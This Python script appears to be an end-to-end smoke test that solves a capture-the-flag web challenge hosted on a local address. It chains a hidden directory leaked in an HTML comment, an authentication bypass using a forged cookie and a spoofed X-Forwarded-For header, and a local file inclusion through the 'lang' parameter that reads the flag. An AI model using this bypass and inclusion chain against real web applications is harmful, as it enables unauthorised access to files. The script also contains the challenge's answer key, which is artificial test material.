#!/usr/bin/env python3
"""
web-intranet end-to-end smoke test.
Chain: hidden dir leaked in an HTML comment on / -> auth bypass with
Cookie: access=true + X-Forwarded-For: 192.168.0.1 -> LFI ?lang=flag.txt (include) reads flag.
Exit 0 = PASS.
"""
import os
import re
import sys
import time

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10006").rstrip("/")
HIDDEN = "e7fa32cb05ba9ddc8d5f75bdf1694790"
BYPASS = {"Cookie": "access=true", "X-Forwarded-For": "192.168.0.1"}
FLAG_RE = re.compile(r"CTF\{[^}]+\}")


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def wait_up():
    for _ in range(30):
        try:
            if requests.get(f"{TARGET}/", timeout=5).status_code < 500:
                return
        except requests.RequestException:
            pass
        time.sleep(2)


def solve():
    # 1. discover the hidden directory from the HTML comment breadcrumb on /
    home = requests.get(f"{TARGET}/", timeout=10).text
    assert HIDDEN in home, "hidden-dir breadcrumb not found on /"

    # 2. sanity: without the forged cookie/header the app denies access
    denied = requests.get(f"{TARGET}/{HIDDEN}/", timeout=10).text
    assert "Access Denied" in denied, "expected 'Access Denied' without auth bypass"

    # 3. auth-bypass + LFI: ?lang=flag.txt makes include('flag.txt') echo the flag
    r = requests.get(
        f"{TARGET}/{HIDDEN}/",
        params={"lang": "flag.txt"},
        headers=BYPASS,
        timeout=10,
    )
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else ""


def main():
    wait_up()
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
